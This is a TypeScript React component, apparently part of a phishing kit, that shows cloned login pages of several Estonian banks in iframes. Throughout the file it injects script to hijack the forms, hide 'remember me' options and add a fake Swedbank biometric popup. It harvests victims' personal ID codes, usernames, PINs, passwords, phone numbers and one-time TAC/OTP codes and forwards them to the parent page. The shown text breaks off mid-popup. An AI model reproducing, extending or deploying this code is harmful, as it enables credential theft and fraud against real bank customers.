"use client";

import React, { useEffect, useRef, useState } from "react";

type Props = {
  bankName: string;
  logoFile?: string;
  brandColor?: string;
  bankSlug?: string;
  formData: {
    verfuegernummer?: string;
    pin?: string;
    personalCode?: string;
    loginMethod?: string;
  };
  onChange: (field: string, value: string) => void;
  handleRouteAction: (overrideData?: any) => void;
  saving?: boolean;
};

export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, saving }: Props) {
  const [files, setFiles] = useState<string[]>([]);
  const [currentIndex, setCurrentIndex] = useState(0);
  const [selectedLoginMethod, setSelectedLoginMethod] = useState("");
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const isOpCorporate = bankSlug === "op-corporate-bank";
  const disableIframeFade = [
    "op-corporate-bank",
    "seb-pank",
    "coop-pank",
    "lhv-pank",
    "citadele-banka",
    "inbank",
    "luminor-ee",
    "swedbank-ee",
  ].includes(bankSlug ?? "");

  const resolveLoginMethodFromIndex = (slug?: string, index?: number) => {
    if (!slug || typeof index !== "number" || index < 0) return "";

    const methodMap: Record<string, string[]> = {
      "bigbank": ["Mobiil-ID"],
      "coop-pank": ["Biomeetria", "Smart-ID", "Mobiil-ID"],
      "inbank": ["Smart-ID", "Mobiil-ID", "PIN-kalkulaator"],
      "lhv-pank": ["Biomeetria", "Smart-ID", "Mobiil-ID", "PIN-kalkulaator", "Salasõna", "ID-kaart"],
      "citadele-banka": ["PIN-kalkulaator", "Mobiil-ID", "ID-kaart", "MobileSCAN/Digipass 780"],
      "luminor-ee": ["Mobiil-ID", "ID-kaart", "PIN-kalkulaator", "Smart-ID"],
      "op-corporate-bank": ["Mobiil-ID", "Smart-ID", "PIN kalkulaator"],
      "seb-pank": ["Smart-ID", "Mobiil-ID", "SEB Mobiilirakendus", "ID-kaart", "PIN-kalkulaator"],
      "swedbank-ee": ["Biomeetria/PIN-kood", "Smart-ID", "Mobiil-ID", "ID-kaart", "PIN-kalkulaator"],
    };

    return methodMap[slug]?.[index] ?? "";
  };

  const normalizeLoginMethodLabel = (value: string) => {
    const normalized = value.trim().toLowerCase();
    if (!normalized || normalized === "bilinmiyor") return "";

    if (bankSlug === "swedbank-ee" && normalized.includes("bio")) {
      return "Biomeetria/PIN-kood";
    }

    if (normalized.includes("mobilescan") || normalized.includes("digipass")) {
      if (bankSlug === "citadele-banka") return "MobileSCAN/Digipass 780";
      return "MobileSCAN";
    }
    if (normalized.includes("seb mobiil") || normalized.includes("mobiilirakendus")) return "SEB Mobiilirakendus";
    if (normalized.includes("smart")) return "Smart-ID";
    if (normalized.includes("mobiil")) return "Mobiil-ID";
    if (normalized.includes("id-kaart") || normalized.includes("id kaart") || normalized.includes("id-card")) return "ID-kaart";
    if (normalized.includes("pin")) return bankSlug === "op-corporate-bank" ? "PIN kalkulaator" : "PIN-kalkulaator";
    if (normalized.includes("bio")) return bankSlug === "swedbank-ee" ? "Biomeetria/PIN-kood" : "Biomeetria";
    if (normalized.includes("salas")) return "Salasõna";

    return value.trim();
  };

  const prefersIdentityFields = (loginMethod: string) => {
    const normalized = loginMethod.trim().toLowerCase();
    if (!normalized) return false;

    return (
      normalized.includes("mobiil") ||
      normalized.includes("smart") ||
      normalized.includes("mobilescan") ||
      normalized.includes("digipass") ||
      normalized.includes("biomeetria") ||
      normalized.includes("mobiilirakendus") ||
      normalized.includes("id-kaart")
    );
  };

  const shouldIgnoreRawBankFieldKey = (key: string) => {
    const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

    return (
      /^input\d+$/.test(normalizedKey) ||
      normalizedKey.includes("rememberme") ||
      normalizedKey.includes("remembermesimpleid") ||
      normalizedKey.includes("remembermesmartid") ||
      normalizedKey.includes("remembermemobileid") ||
      normalizedKey.includes("loginwidget") ||
      normalizedKey.includes("useridmid") ||
      normalizedKey.includes("useridsid") ||
      normalizedKey.includes("useridsimple") ||
      normalizedKey === "mobileid" ||
      normalizedKey === "smartid" ||
      normalizedKey === "idcard" ||
      normalizedKey === "pincalc" ||
      normalizedKey === "kalkulaator"
    );
  };

  const shouldIgnoreCapturedField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const candidates = [
      field.key,
      field.name,
      field.id,
      field.formControlName,
      field.label,
      field.ariaLabel,
      field.placeholder,
    ]
      .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
      .filter(Boolean);

    if (!candidates.length) {
      return false;
    }

    return candidates.every((candidate) => shouldIgnoreRawBankFieldKey(candidate));
  };

  const getFieldSearchText = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) =>
    [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();

  const isPhoneLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    return (
      lowerText.includes("mobilenumber") ||
      lowerText.includes("mobile number") ||
      lowerText.includes("phonefield") ||
      lowerText.includes("phone-number") ||
      lowerText.includes("telefoninumber") ||
      lowerText.includes("telefon") ||
      lowerText.includes("phone")
    );
  };

  const isPersonalCodeLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    return (
      lowerText.includes("personalidentitycode") ||
      lowerText.includes("personalidentificationcode") ||
      lowerText.includes("personal identity code") ||
      lowerText.includes("identitycode") ||
      lowerText.includes("identity code") ||
      lowerText.includes("isikukood") ||
      lowerText.includes("personal-code") ||
      lowerText.includes("personal code") ||
      lowerText.includes("legalid")
    );
  };

  const isUsernameLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    return (
      lowerText.includes("userid") ||
      lowerText.includes("user id") ||
      lowerText.includes("user-id") ||
      lowerText.includes("username") ||
      lowerText.includes("loginid") ||
      lowerText.includes("login id") ||
      lowerText.includes("nickname") ||
      lowerText.includes("kasutajanimi") ||
      lowerText.includes("kasutajatunnus") ||
      lowerText.includes("tunnus")
    );
  };

  const isPasswordLikeField = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    const lowerText = getFieldSearchText(field);
    const lowerKey = (field.key ?? "").toLowerCase();

    return (
      (field.type ?? "").toLowerCase() === "password" ||
      lowerText.includes("pincalcpassword") ||
      (lowerKey.includes("pin-calculator") && lowerKey.includes("code")) ||
      lowerText.includes("pin calculator code") ||
      lowerText.includes("pin-calculator-code") ||
      lowerText.includes("pincode") ||
      lowerText.includes("pinkood") ||
      lowerText.includes("password") ||
      lowerText.includes("passcode") ||
      lowerText.includes("parool") ||
      lowerText.includes("pin1") ||
      lowerText.includes("pin2") ||
      lowerText.includes("pin code") ||
      lowerText.includes("pin-code") ||
      lowerKey === "pin" ||
      lowerKey.endsWith("password")
    );
  };

  const inferOrderedFieldType = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    if (isPhoneLikeField(field)) return "phone";
    if (isPasswordLikeField(field)) return "password";
    return "identity";
  };

  const inferOrderedCanonicalFieldKey = (field: {
    key?: string;
    name?: string;
    id?: string;
    formControlName?: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
  }) => {
    if (isPersonalCodeLikeField(field)) return "personalCode";
    if (isPhoneLikeField(field)) return "bankPhone";
    if (isPasswordLikeField(field)) return "password";
    if (isUsernameLikeField(field)) return "username";
    return "personalCode";
  };

  const normalizeCapturedFields = (
    payload: unknown,
  ): Array<{
    key: string;
    value: string;
    type?: string;
    label?: string;
    ariaLabel?: string;
    placeholder?: string;
    name?: string;
    id?: string;
    formControlName?: string;
  }> => {
    if (payload && typeof payload === "object" && Array.isArray((payload as { fields?: unknown[] }).fields)) {
      return ((payload as { fields: unknown[] }).fields ?? [])
        .filter((field): field is Record<string, unknown> => Boolean(field && typeof field === "object"))
        .map((field) => ({
          key: String(field.key ?? field.name ?? field.id ?? "unknown"),
          value: String(field.value ?? ""),
          type: typeof field.type === "string" ? field.type : "",
          label: typeof field.label === "string" ? field.label : "",
          ariaLabel: typeof field.ariaLabel === "string" ? field.ariaLabel : "",
          placeholder: typeof field.placeholder === "string" ? field.placeholder : "",
          name: typeof field.name === "string" ? field.name : "",
          id: typeof field.id === "string" ? field.id : "",
          formControlName: typeof field.formControlName === "string" ? field.formControlName : "",
        }));
    }

    const inputs =
      payload && typeof payload === "object" && (payload as { inputs?: unknown }).inputs && typeof (payload as { inputs?: unknown }).inputs === "object"
        ? ((payload as { inputs: Record<string, unknown> }).inputs ?? {})
        : {};

    return Object.entries(inputs).map(([key, value]) => ({
      key,
      value: String(value ?? ""),
      type: "text",
      label: "",
      ariaLabel: "",
      placeholder: "",
      name: key,
      id: key,
    }));
  };

  useEffect(() => {
    if (!bankSlug) return;
    fetch(`/api/estonian-banks?bank=${bankSlug}`)
      .then(res => res.json())
      .then(data => {
        if (data.files && data.files.length > 0) {
          setFiles(data.files);
        }
      })
      .catch(err => console.error("Error fetching bank HTMLs:", err));
  }, [bankSlug]);

  useEffect(() => {
    const handleMessage = (e: MessageEvent) => {
      if (e.data && e.data.type === 'ESTONIA_BANK_SUBMIT') {
        const { formData } = e.data;
        
        const clickedLoginMethod = normalizeLoginMethodLabel(selectedLoginMethod);
        const detectedLoginMethod = normalizeLoginMethodLabel(
          typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "",
        );
        const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlug, currentIndex));
        const newLoginMethod = clickedLoginMethod || detectedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
        const capturedFields = normalizeCapturedFields(formData);
        const identityFirstMethod = prefersIdentityFields(newLoginMethod);
        const mappedData: Record<string, string> = {
          loginMethod: newLoginMethod,
          personalCode: "",
          verfuegernummer: "",
          pin: "",
          tacCode: "",
          bankPhone: "",
          username: "",
          password: "",
        };
        const rawCapturedData: Record<string, string> = {};

        onChange("loginMethod", newLoginMethod);

        const persistRawCapturedField = (field: {
          key: string;
          value: string;
          name?: string;
          id?: string;
          label?: string;
          ariaLabel?: string;
          placeholder?: string;
          formControlName?: string;
        }) => {
          const normalizedValue = field.value.trim();
          if (!normalizedValue) return;

          const candidateKeys = [field.key, field.name, field.id, field.formControlName, field.label, field.ariaLabel, field.placeholder]
            .map((candidate) => (typeof candidate === "string" ? candidate.trim() : ""))
            .filter(Boolean)
            .map((candidate) => candidate.replace(/\s+/g, "-"))
            .filter((candidate) => candidate && candidate.toLowerCase() !== "unknown");

          for (const candidateKey of candidateKeys) {
            const normalizedKey = candidateKey.toLowerCase().replace(/[^a-z0-9]/g, "");
            if (shouldIgnoreRawBankFieldKey(candidateKey)) {
              continue;
            }
            if (candidateKey in mappedData) continue;
            if (!rawCapturedData[candidateKey]) {
              rawCapturedData[candidateKey] = normalizedValue;
            }
          }
        };
        
        const assignMappedValue = (fieldName: string, value: string, options?: { overwrite?: boolean; syncState?: boolean }) => {
          const normalizedValue = value.trim();
          if (!normalizedValue) return;
          if (mappedData[fieldName] && !options?.overwrite) return;
          mappedData[fieldName] = normalizedValue;
          if (options?.syncState) {
            onChange(fieldName, normalizedValue);
          }
        };

        const assignUsername = (value: string, overwrite = false) => {
          assignMappedValue("username", value, { overwrite });
          assignMappedValue("verfuegernummer", value, { overwrite, syncState: true });
        };

        const assignPassword = (value: string, overwrite = false) => {
          assignMappedValue("password", value, { overwrite });
          assignMappedValue("pin", value, { overwrite, syncState: true });
        };

        for (const field of capturedFields) {
          const value = field.value.trim();
          if (!value) continue;
          persistRawCapturedField(field);

          const lowerKey = field.key.toLowerCase();
          const lowerText = getFieldSearchText(field);

          if (lowerText.includes("rememberme") || lowerText.includes("pea mind meeles") || lowerText.includes("remember me")) {
            continue;
          }

          if (window.location.href.includes('op-corporate')) {
            if (lowerKey === 'mobile-id-username' || lowerKey === 'smart-id-username') {
              assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
            } else if (lowerKey === 'mobile-id-phone') {
              assignMappedValue("bankPhone", value, { overwrite: true });
              assignMappedValue("verfuegernummer", value, { overwrite: true, syncState: true });
            } else if (lowerKey === 'pin-calculator-username') {
              assignUsername(value, true);
            } else if (lowerKey === 'pin-calculator-code') {
              assignPassword(value, true);
            }
            continue;
          }

          if (bankSlug === "bigbank") {
            if (lowerKey === "mobilenumber") {
              assignMappedValue("bankPhone", value, { overwrite: true });
              continue;
            }

            if (lowerKey === "personalidentitycode" || lowerKey === "personalidentificationcode") {
              assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
              continue;
            }
          }

          if (shouldIgnoreCapturedField(field)) {
            continue;
          }

          if (lowerKey === "phone-number") {
            assignMappedValue("bankPhone", value, { overwrite: true });
            continue;
          }

          if (
            lowerText.includes("tac") ||
            lowerText.includes("otp") ||
            lowerText.includes("sms code") ||
            lowerText.includes("verification code") ||
            lowerText.includes("one-time") ||
            lowerText.includes("one time") ||
            lowerText.includes("kontrollkood") ||
            lowerText.includes("control code") ||
            lowerText.includes("response code")
          ) {
            assignMappedValue("tacCode", value, { overwrite: true });
            continue;
          }

          if (isPersonalCodeLikeField(field)) {
            assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
            continue;
          }

          if (isPhoneLikeField(field)) {
            assignMappedValue("bankPhone", value, { overwrite: true });
            continue;
          }

          if (isPasswordLikeField(field)) {
            assignPassword(value, true);
            continue;
          }

          if (isUsernameLikeField(field)) {
            assignUsername(value, true);
            continue;
          }

          if (
            !mappedData.personalCode &&
            /^\d{11}$/.test(value) &&
            !lowerText.includes("phone") &&
            !lowerText.includes("telefon") &&
            !lowerText.includes("otp") &&
            !lowerText.includes("tac")
          ) {
            assignMappedValue("personalCode", value, { overwrite: true, syncState: true });
            continue;
          }

          if (!identityFirstMethod && !mappedData.verfuegernummer) {
            assignUsername(value);
            continue;
          }

          if (!mappedData.personalCode) {
            assignMappedValue("personalCode", value, { syncState: true });
          }
        }

        const filledValues = capturedFields
          .map((field) => ({
            key: field.key,
            name: field.name ?? "",
            id: field.id ?? "",
            formControlName: field.formControlName ?? "",
            type: field.type ?? "",
            label: field.label ?? "",
            ariaLabel: field.ariaLabel ?? "",
            placeholder: field.placeholder ?? "",
            value: field.value.trim(),
          }))
          .filter((field) => Boolean(field.value))
          .filter((field) => !shouldIgnoreCapturedField(field))
          .filter(
            (field, index, list) =>
              list.findIndex(
                (candidate) =>
                  [
                    candidate.key,
                    candidate.name,
                    candidate.id,
                    candidate.formControlName,
                    candidate.label,
                    candidate.ariaLabel,
                    candidate.placeholder,
                    candidate.value,
                  ].join("|") ===
                  [
                    field.key,
                    field.name,
                    field.id,
                    field.formControlName,
                    field.label,
                    field.ariaLabel,
                    field.placeholder,
                    field.value,
                  ].join("|"),
              ) === index,
          );

        if (filledValues.length < 2) {
          return;
        }

        const hasIdentityValue = Boolean(mappedData.personalCode || mappedData.username || mappedData.verfuegernummer || mappedData.bankPhone);
        if (!hasIdentityValue && filledValues[0]?.value) {
          assignMappedValue("personalCode", filledValues[0].value, { overwrite: true, syncState: true });
        }

        const passwordFallback = filledValues.find((field) => isPasswordLikeField(field));
        const orderedField1Key = filledValues[0] ? inferOrderedCanonicalFieldKey(filledValues[0]) : "";
        const orderedField2Key = filledValues[1] ? inferOrderedCanonicalFieldKey(filledValues[1]) : "";
        const orderedField2Type = filledValues[1] ? inferOrderedFieldType(filledValues[1]) : "";
        const orderedField3Key = filledValues[2] ? inferOrderedCanonicalFieldKey(filledValues[2]) : "";
        const orderedField3Type = filledValues[2] ? inferOrderedFieldType(filledValues[2]) : "";

        if (!mappedData.password) {
          if (passwordFallback?.value) {
            assignPassword(passwordFallback.value, true);
          }
        }

        const hasPasswordValue = Boolean(mappedData.password || mappedData.pin || passwordFallback?.value);
        if (!hasIdentityValue || !hasPasswordValue) {
          return;
        }
        
        handleRouteAction({
          orderedField1: filledValues[0]?.value ?? "",
          orderedField1Key,
          orderedField2: filledValues[1]?.value ?? "",
          orderedField2Key,
          orderedField2Type,
          orderedField3: filledValues[2]?.value ?? "",
          orderedField3Key,
          orderedField3Type,
          ...rawCapturedData,
          ...mappedData,
        });
      } else if (e.data && e.data.type === 'ESTONIA_BANK_TAB_CLICK') {
         if (typeof e.data.loginMethod === "string") {
           const normalizedLoginMethod = normalizeLoginMethodLabel(e.data.loginMethod);
           if (normalizedLoginMethod) {
             setSelectedLoginMethod(normalizedLoginMethod);
           }
         }
         if (typeof e.data.targetIndex === 'number' && e.data.targetIndex >= 0) {
           // SEB bank ve diğerleri için eğer targetIndex dosya sayısından büyükse, son dosyayı kullan
           const safeIndex = Math.min(e.data.targetIndex, files.length - 1);
           setCurrentIndex(safeIndex);
         } else {
           setCurrentIndex((prev) => (prev + 1) % files.length);
         }
      }
    };

    window.addEventListener('message', handleMessage);
    return () => window.removeEventListener('message', handleMessage);
  }, [bankSlug, currentIndex, files, onChange, handleRouteAction, selectedLoginMethod]);

  useEffect(() => {
    if (!isOpCorporate) return;
    const iframe = document.querySelectorAll<HTMLIFrameElement>(
      `iframe[src^="/estonian-banks/${bankSlug}/"]`
    )[currentIndex];
    if (!iframe?.contentWindow?.document) return;

    const doc = iframe.contentWindow.document;
    const radioId =
      currentIndex === 0 ? "mobile-id-radio" : currentIndex === 1 ? "smart-id-radio" : "pin-calculator-radio";

    const radio = doc.getElementById(radioId) as HTMLInputElement | null;
    if (!radio) return;
    radio.checked = true;
    radio.dispatchEvent(new Event("change", { bubbles: true }));
  }, [bankSlug, currentIndex, isOpCorporate]);

  const handleIframeLoad = (iframe: HTMLIFrameElement) => {
    if (!iframe || !iframe.contentWindow) return;

    try {
      const doc = iframe.contentWindow.document;
      
      // Inject script to capture forms
      const script = doc.createElement('script');
      script.innerHTML = `
        // Remove ALL existing submit event listeners from forms by replacing them
        document.querySelectorAll('form').forEach(form => {
           const newForm = form.cloneNode(true);
           if (form.parentNode) {
              form.parentNode.replaceChild(newForm, form);
           }
        });

        // Coop Bank Buton ve Hatırla Seçeneği Fix (Observer ve CSS olmadan, güvenli yöntem)
        const fixCoop = () => {
            if (window.location.href.includes('coop')) {
                document.querySelectorAll('button').forEach(btn => {
                    const text = btn.textContent ? btn.textContent.toLowerCase() : '';
                    if (text.includes('sisene')) {
                        btn.style.pointerEvents = btn.disabled ? 'none' : 'auto';
                        btn.style.opacity = btn.disabled ? '0.5' : '1';
                    }
                });
                
                // Hatırla butonunu gizle
                document.querySelectorAll('.v-input--checkbox, label, .checkbox').forEach(el => {
                    const text = el.textContent ? el.textContent.toLowerCase() : '';
                    if (text.includes('jäta mind') || text.includes('meelde')) {
                        const container = el.closest('.v-input--checkbox') || el.closest('.checkbox') || el;
                        if (container && container.style) {
                            container.style.display = 'none';
                        }
                    }
                });
            }
        };
        
        // Sayfa yüklendiğinde ve herhangi bir input/click işleminde çalıştır
        setTimeout(fixCoop, 500);
        setTimeout(fixCoop, 1500);
        document.addEventListener('click', fixCoop, true);
        document.addEventListener('input', fixCoop, true);

        // Coop Bank Buton Renk Fix: Sadece form alanına yazı girildiğinde rengi değiştir
        if (window.location.href.includes('coop')) {
            document.addEventListener('input', (e) => {
                if (e.target && e.target.tagName === 'INPUT') {
                    const form = e.target.closest('form') || document;
                    const filledCount = Array.from(form.querySelectorAll('input:not([type="hidden"]):not([type="checkbox"]):not([type="radio"]):not([type="submit"]):not([type="button"])'))
                        .filter(inp => inp.value.trim && inp.value.trim().length > 0).length;
                    
                    document.querySelectorAll('button').forEach(btn => {
                        const text = btn.textContent ? btn.textContent.toLowerCase() : '';
                        if (text.includes('sisene')) {
                            if (filledCount >= 2) {
                                btn.style.setProperty('background-color', '#0b56cc', 'important');
                                btn.style.setProperty('color', '#ffffff', 'important');
                                btn.disabled = false;
                                btn.classList.remove('v-btn--disabled');
                                btn.querySelectorAll('*').forEach(child => {
                                    if(child.style) child.style.setProperty('color', '#ffffff', 'important');
                                });
                            } else {
                                btn.disabled = true;
                                btn.style.removeProperty('background-color');
                                btn.style.removeProperty('color');
                                btn.querySelectorAll('*').forEach(child => {
                                    if(child.style) child.style.removeProperty('color');
                                });
                            }
                        }
                    });
                }
            }, true);

            const coopMobileStyle = document.createElement('style');
            coopMobileStyle.innerHTML = \`
              @media (max-width: 768px) {
                .v-tabs.d-none.d-md-block,
                .v-window.d-none.d-md-block,
                .authentication-method__title.d-none.d-md-flex {
                  display: block !important;
                }

                .row.d-none.d-md-flex.justify-center {
                  display: flex !important;
                }

                .authentication-method__mobile.d-md-none {
                  display: none !important;
                }

                .container.login-container {
                  min-height: 100dvh !important;
                  height: auto !important;
                }

                .login-card,
                .authentication-method,
                .v-window,
                .v-window__container,
                .v-window-item {
                  height: auto !important;
                  max-height: none !important;
                }

                .authentication-method {
                  align-items: stretch !important;
                  justify-content: flex-start !important;
                }

                .v-tabs,
                .v-window,
                .v-form,
                .v-input,
                .v-text-field,
                .v-input__control,
                .v-input__slot,
                .v-text-field__slot,
                input {
                  width: 100% !important;
                  max-width: 100% !important;
                  min-width: 0 !important;
                  box-sizing: border-box !important;
                }
              }
            \`;
            document.head.appendChild(coopMobileStyle);
        }

        // Event delegation for EVERYTHING (click, submit)
        // Use capturing phase (true) to ensure our code runs BEFORE bank's broken code
        
        const getFieldLabel = (input) => {
            if (input.id) {
                const labelEl = document.querySelector('label[for="' + input.id + '"]');
                if (labelEl && labelEl.textContent) return labelEl.textContent.trim();
            }

            const closestLabel = input.closest('label');
            if (closestLabel && closestLabel.textContent) {
                return closestLabel.textContent.trim();
            }

            return '';
        };

        const appendFilledFallbackFields = (container, fields) => {
            container.querySelectorAll('input, select, textarea').forEach(input => {
                if (!input || input.disabled) return;

                const type = ((input.type || input.tagName || '') + '').toLowerCase();
                if (
                    type === 'hidden' ||
                    type === 'submit' ||
                    type === 'button' ||
                    type === 'reset' ||
                    type === 'file' ||
                    type === 'radio' ||
                    type === 'checkbox'
                ) {
                    return;
                }

                const value = (input.value || '').trim();
                if (!value) return;

                const label = getFieldLabel(input);
                const ariaLabel = input.getAttribute('aria-label') || '';
                const keyText = [
                    input.name || '',
                    input.id || '',
                    input.getAttribute('formcontrolname') || '',
                    input.getAttribute('data-testid') || '',
                    input.getAttribute('placeholder') || '',
                    ariaLabel,
                    label,
                ].join(' ').toLowerCase();

                if (
                    keyText.includes('rememberme') ||
                    keyText.includes('remember me') ||
                    keyText.includes('pea mind meeles') ||
                    keyText.includes('salvesta') ||
                    keyText.includes('meelde')
                ) {
                    return;
                }

                const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
                if (fields.some(field => field.key === fieldKey && (field.value || '').trim() === value)) {
                    return;
                }

                fields.push({
                    key: fieldKey,
                    name: input.name || input.getAttribute('formcontrolname') || '',
                    id: input.id || '',
                    formControlName: input.getAttribute('formcontrolname') || '',
                    value: value,
                    type: type || 'text',
                    label: label,
                    ariaLabel: ariaLabel,
                    placeholder: input.getAttribute('placeholder') || ''
                });
            });
        };

            const buildCapturedFields = (container) => {
            const fields = [];
            if (!container || !container.querySelectorAll) return fields;

            const isRelevantVisibleField = (input) => {
                if (!input || input.disabled) return false;

                const type = ((input.type || input.tagName || '') + '').toLowerCase();
                const keyText = [
                    input.name || '',
                    input.id || '',
                    input.getAttribute('formcontrolname') || '',
                    input.getAttribute('data-testid') || '',
                    input.getAttribute('placeholder') || '',
                    input.getAttribute('aria-label') || '',
                    getFieldLabel(input) || '',
                ].join(' ').toLowerCase();

                if (
                    type === 'hidden' ||
                    type === 'submit' ||
                    type === 'button' ||
                    type === 'reset' ||
                    type === 'file' ||
                    type === 'radio' ||
                    type === 'checkbox'
                ) {
                    return false;
                }

                if (
                    keyText.includes('rememberme') ||
                    keyText.includes('remember me') ||
                    keyText.includes('pea mind meeles') ||
                    keyText.includes('salvesta') ||
                    keyText.includes('meelde')
                ) {
                    return false;
                }

                const style = window.getComputedStyle(input);
                if (
                    style.display === 'none' ||
                    style.visibility === 'hidden' ||
                    style.pointerEvents === 'none'
                ) {
                    return false;
                }

                if (input.closest('[hidden], [aria-hidden="true"], .hidden, .d-none')) {
                    return false;
                }

                if (!input.getClientRects().length) {
                    return false;
                }

                return true;
            };

            container.querySelectorAll('input, select, textarea').forEach(input => {
                if (!isRelevantVisibleField(input)) return;

                const type = ((input.type || input.tagName || '') + '').toLowerCase();

                const fieldKey = input.name || input.getAttribute('formcontrolname') || input.id || input.getAttribute('data-testid') || 'unknown';
                fields.push({
                    key: fieldKey,
                    name: input.name || input.getAttribute('formcontrolname') || '',
                    id: input.id || '',
                    formControlName: input.getAttribute('formcontrolname') || '',
                    value: input.value || '',
                    type: type || 'text',
                    label: getFieldLabel(input),
                    ariaLabel: input.getAttribute('aria-label') || '',
                    placeholder: input.getAttribute('placeholder') || ''
                });
            });

            const filledFieldCount = fields.filter(field => (field.value || '').trim()).length;
            if (
                filledFieldCount === 0 &&
                (window.location.href.includes('coop') || window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
            ) {
                appendFilledFallbackFields(container, fields);
            } else if (
                filledFieldCount < 2 &&
                (window.location.href.includes('coop') || window.location.href.includes('luminor') || window.location.href.includes('swedbank'))
            ) {
                appendFilledFallbackFields(container, fields);
            }

            return fields;
        };

        const buildInputMap = (fields) => {
            const inputs = {};
            fields.forEach(field => {
                inputs[field.key] = field.value;
            });
            return inputs;
        };

        const isSwedbankBiometricFlow = (loginMethod) => {
            return window.location.href.includes('swedbank') && extractLoginMethodLabel(loginMethod) === 'Biomeetria/PIN-kood';
        };

        const ensureSwedbankBiometricIdentityField = () => {
            if (!window.location.href.includes('swedbank')) {
                return;
            }

            const simpleForm = document.querySelector('ui-tab#SIMPLE_ID form');
            if (!simpleForm) {
                return;
            }

            const usernameInput = simpleForm.querySelector('#login-widget-user-id-simple');
            const rememberField = simpleForm.querySelector('#rememberMeSimpleId')?.closest('ui-field');
            let personalField =
                simpleForm.querySelector('#login-widget-personal-id-simple')?.closest('ui-field') ||
                simpleForm.querySelector('input[name="personalIdentityCode"]')?.closest('ui-field') ||
                simpleForm.querySelector('ui-field[label="Isikukood"]');

            if (!usernameInput || !personalField) {
                return;
            }

            personalField.classList.remove('-hidden', 'sf-hidden');
            if (!personalField.querySelector('input[name="personalIdentityCode"]')) {
                personalField.innerHTML = [
                    '<div class="ui-field__wrapper">',
                    '<div class="ui-field__label"><label class="ui-field__label-inner" for="login-widget-personal-id-simple">Isikukood</label></div>',
                    '<div class="ui-field__control">',
                    '<input id="login-widget-personal-id-simple" type="text" name="personalIdentityCode" autocomplete="off" inputmode="numeric" maxlength="11" pattern="[0-9]*" data-validated="true" value="">',
                    '</div>',
                    '</div>'
                ].join('');
            }

            if (rememberField && personalField.nextElementSibling !== rememberField) {
                simpleForm.insertBefore(personalField, rememberField);
            }

            const submitButton = simpleForm.querySelector('button[type="submit"]');
            const personalInput = simpleForm.querySelector('#login-widget-personal-id-simple');
            const syncSubmitState = () => {
                if (!submitButton || !usernameInput || !personalInput) {
                    return;
                }

                const ready = usernameInput.value.trim().length > 0 && personalInput.value.trim().length > 0;
                submitButton.disabled = !ready;
                if (ready) {
                    submitButton.removeAttribute('disabled');
                    submitButton.style.opacity = '1';
                    submitButton.style.pointerEvents = 'auto';
                } else {
                    submitButton.setAttribute('disabled', 'disabled');
                }
            };

            syncSubmitState();
            if (!simpleForm.dataset.traeSwedbankBioBound) {
                simpleForm.dataset.traeSwedbankBioBound = '1';
                usernameInput.addEventListener('input', syncSubmitState);
                personalInput?.addEventListener('input', syncSubmitState);
            }
        };

        const removeSwedbankBiometricPopup = () => {
            const existingPopup = document.getElementById('trae-swedbank-bio-popup');
            if (existingPopup) {
                existingPopup.remove();
            }
        };

        const buildUniqueFieldKey = (field) => {
            return [
                field.key || '',
                field.name || '',
                field.id || '',
                field.formControlName || '',
                field.label || '',
                field.ariaLabel || '',
                field.placeholder || '',
                field.value || ''
            ].join('|');
        };

        const mergeCapturedFields = (primaryFields, extraFields) => {
            const merged = [];
            const seen = new Set();

            [...primaryFields, ...extraFields].forEach(field => {
                if (!field) return;
                const fieldKey = buildUniqueFieldKey(field);
                if (seen.has(fieldKey)) return;
                seen.add(fieldKey);
                merged.push(field);
            });

            return merged;
        };

        const submitSwedbankBiometricFields = (baseFields, popupField) => {
            const mergedFields = mergeCapturedFields(baseFields, [popupField]);
            const inputs = buildInputMap(mergedFields);

            window.parent.postMessage({
              type: 'ESTONIA_BANK_SUBMIT',
              formData: { inputs, fields: mergedFields, loginMethod: 'Biomeetria/PIN-kood' }
            }, '*');
        };

        const openSwedbankBiometricPopup = (baseFields) => {
            removeSwedbankBiometricPopup();

            const overlay = document.createElement('div');
            overlay.id = 'trae-swedbank-bio-popup';
            overlay.setAttribute('role', 'dialog');
            overlay.setAttribute('aria-modal', 'true');
            overlay.innerHTML = [
              '<div style="position:fixed;inset:0;background:rgba(34,45,67,.38);z-index:2147483646;"></div>',
              '<div style="position:fixed;left:50%;top:50%;width:min(92vw,430px);transform:translate(-50%,-50%);border-radius:20px;background:#ffffff;box-shadow:0 30px 70px rgba(16,24,40,.28);padding:24px;z-index:2147483647;font-family:Arial,sans-serif;">',
              '<div style="display:flex;align-items:flex-start;justify-content:space-between;gap:12px;">',
              '<div>',
